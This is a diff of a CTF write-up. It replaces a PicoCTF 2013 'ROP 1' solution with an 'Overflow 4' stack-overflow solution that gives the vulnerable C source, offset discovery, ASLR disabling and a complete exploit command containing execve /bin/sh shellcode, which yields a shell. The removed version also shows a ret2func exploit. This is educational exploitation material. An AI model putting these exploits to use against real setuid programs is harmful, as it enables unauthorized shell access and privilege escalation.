@@ -1,74 +1,166 @@
-# PicoCTF 2013: ROP 1
+# PicoCTF 2013: Overflow 4
 
 **Category:** Binary Exploitation
-**Points:** 95
+**Points:** 150
 **Description:**
 
-> ROP is a classic technique for getting around address randomization and
-> non-executable memory. This sequence will teach you the basics.
->
-> Problem available on the shell machine in /problems/ROP_1_fa6168f4d8eba0eb ,
-> downloadable [here](https://2013.picoctf.com/problems/rop1-fa6168f4d8eba0eb)  with source [here](https://2013.picoctf.com/problems/rop1-fa6168f4d8eba0eb.c).
->
->
+>Stack overflows are the most basic binary exploitation technique, but they
+>take a lot of skill to master. If you already know some C, these problems can
+>help acquaint you with stacks and binary exploitation in general.
+
+>Problem available on the shell machine in
+>/problems/stack_overflow_4_4834efeff17abdfb , downloadable [here](https://2013.picoctf.com/problems/overflow4-4834efeff17abdfb) with source
+>[here](https://2013.picoctf.com/problems/overflow4-4834efeff17abdfb.c).
+
+>If you solve the problem you will be able to read the key file by running
+
+>cat /problems/stack_overflow_4_4834efeff17abdfb/key
+>on the PicoCTF shell machine.
+
+>**HINT:**  Gonna need some [shellcode](http://en.wikipedia.org/wiki/Shellcode). Luckily some is provided for you in the
+>directory on the shell machine.
 
 ## Write-up
-Looking at the C code, there are two interesting functions:
+
+Let's look at the source:
 ```C
-int not_called() {
-return system("/bin/bash");
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "dump_stack.h"
+
+
+/*
+ * Goal: Get the program to run a shell.
+ */
+
+void vuln(char *str) {
+    char buf[64];
+    strcpy(buf, str);
+    dump_stack((void **) buf, 21, (void **) &str);
 }
 
-void vulnerable_function() {
-    char buf[128];
-    read(STDIN_FILENO, buf, 256);
+int main(int argc, char **argv) {
+    if (argc != 2) {
+        printf("Usage: buffer_overflow_shellcode [str]\n");
+        return 1;
+    }
+
+    uid_t euid = geteuid();
+    setresuid(euid, euid, euid);
+    vuln(argv[1]);
+    return 0;
 }
 ```
-As you may have guessed, the vulnerability is in the `vulnerable_function()`.
-The function calls `read()` with a size of 256, whereas the buffer only has 128
-spaces to fill. This is what is referred to as a buffer overflow, and we're
-going to use it to get a shell.
 
-The main difference between the overfllow problems and ROP is that ROP type
-problems have NX/ASLR enabled, and sometimes other protections. This means that 
-libc and stack addresses are random, and that no memory is simultaneously
-writeable and executable. RIP shellcode.
+No convenient functions, and no calls to system are given to us. This means
+that we need to get shellcode to run.
 
-Luckily, `not_called()` does most of the heavy lifting for us. Since
-ASLR **does not** randomize the addresses in the executable, we can reliably
-supply the address of `not_called()` and get a shell!
+**Disclaimer: I've spoken to people who solved this during the actual contest. They
+said that using ulimit to solve this problem was encouraged and/or hinted at by
+the creators. In addition, I haven't been able to exploit it with ASLR
+enabled.**
 
-Some quick scratchwork shows that $eip is under our control after 140 bytes 
-have been supplied:
+Now that that's out of the way, the first thing we do is find the offset before
+we hijack `eip`
 
 ```
-python -c 'print "A"\*140 + "BBBB"' | strace ./rop1-fa6168f4d8eba0eb
-...
---- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+$ ./overflow4-4834efeff17abdfb $(python -c 'print "A"*76 + "BBBB"')
+
+Stack dump:
+0xffc3b180: 0xffc3c800 (first argument)
+0xffc3b17c: 0x42424242 (saved eip)
+0xffc3b178: 0x41414141 (saved ebp)
+0xffc3b174: 0x41414141
+0xffc3b170: 0x41414141
+0xffc3b16c: 0x41414141
+0xffc3b168: 0x41414141
+0xffc3b164: 0x41414141
+0xffc3b160: 0x41414141
+0xffc3b15c: 0x41414141
+0xffc3b158: 0x41414141
+0xffc3b154: 0x41414141
+0xffc3b150: 0x41414141
+0xffc3b14c: 0x41414141
+0xffc3b148: 0x41414141
+0xffc3b144: 0x41414141
+0xffc3b140: 0x41414141
+0xffc3b13c: 0x41414141
+0xffc3b138: 0x41414141
+0xffc3b134: 0x41414141
+0xffc3b130: 0x41414141 (beginning of buffer)
+Segmentation fault (core dumped)
 ```
 
-Now, instead of "BBBB" we're going to try something more useful. We need the
-address of `not_called()`. We can run: 
-```objdump -d rop1-fa6168f4d8eba0eb | grep "not_called"```
-which yields `080484a4 <not_called>:`
-The address is `0x080484a4`! However, we have to convert that address into an
-escape sequence and to litte endian. Thus:
-```
-python -c 'print "A"\*140 + "\xa4\x84\x04\x08"'| ./rop1-fa6168f4d8eba0eba
-```
-should work.
+Now if you didn't read up on shellcode (go do it!) then here's the gist:
+shellcode is a general name for assembly code that does what you want it to.
+Some are forkbombs, some are connect back, this one just uses a `syscall` to
+get us a shell. Regardless of what it does, if you have the address where the
+shellcode is stored, you can put that into `%eip` to run it. Let's disable ASLR
+so we have constant stack addresses.
 
-However, as indicated in the SMALL_HINT file given to us, it will exit right 
-away. Finally:
 ```
-(python -c 'print "A"\*140 + "\xa4\x84\x04\x08"';cat )| ./rop1-fa6168f4d8eba0eb
+$ setarch `uname -m` -R ./overflow4-4834efeff17abdfb $(python -c 'print "A"*76
++ "BBBB"')
+Stack dump:
+0xffffd660: 0xffffd800 (first argument)
+0xffffd65c: 0x42424242 (saved eip)
+0xffffd658: 0x41414141 (saved ebp)
+0xffffd654: 0x41414141
+0xffffd650: 0x41414141
+0xffffd64c: 0x41414141
+0xffffd648: 0x41414141
+0xffffd644: 0x41414141
+0xffffd640: 0x41414141
+0xffffd63c: 0x41414141
+0xffffd638: 0x41414141
+0xffffd634: 0x41414141
+0xffffd630: 0x41414141
+0xffffd62c: 0x41414141
+0xffffd628: 0x41414141
+0xffffd624: 0x41414141
+0xffffd620: 0x41414141
+0xffffd61c: 0x41414141
+0xffffd618: 0x41414141
+0xffffd614: 0x41414141
+0xffffd610: 0x41414141 (beginning of buffer)
+Segmentation fault (core dumped)
 ```
-will get you a shell!
+If you run this command multiple times, you will see that the addresses on the
+left won't change from run to run. We've disabled ASLR. Now here's the plan to
+get a shell. Since we know the address of our buffer, 0xffffd610, we can
+reliably jump to it. We can put the shellcode in the first part of our buffer,
+and then supply the address to `%eip` hopefully giving us a shell! (The length
+of the shellcode I usually use is 21 bytes)
 
-**Note:** This was solved locally on my machine. When using the PicoCTF shell,
-the name of the binary is simply "rop1". The final command would change to:
 ```
-python -c 'print "A"\*140 + "\xa4\x84\x04\x08"';cat )| ./rop1
+$ setarch `uname -m` -R ./overflow4-4834efeff17abdfb $(python -c 'print
+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
++ "A"*(76-21) + "\x10\xd6\xff\xff"')
+Stack dump:
+0xffffd660: 0xffffd800 (first argument)
+0xffffd65c: 0xffffd610 (saved eip)
+0xffffd658: 0x41414141 (saved ebp)
+0xffffd654: 0x41414141
+0xffffd650: 0x41414141
+0xffffd64c: 0x41414141
+0xffffd648: 0x41414141
+0xffffd644: 0x41414141
+0xffffd640: 0x41414141
+0xffffd63c: 0x41414141
+0xffffd638: 0x41414141
+0xffffd634: 0x41414141
+0xffffd630: 0x41414141
+0xffffd62c: 0x41414141
+0xffffd628: 0x41414141
+0xffffd624: 0x41414180
+0xffffd620: 0xcde3896e
+0xffffd61c: 0x69622f68
+0xffffd618: 0x68732f2f
+0xffffd614: 0x68510bb0
+0xffffd610: 0xe1f7c931 (beginning of buffer)
+$
 ```
 
 pwn.
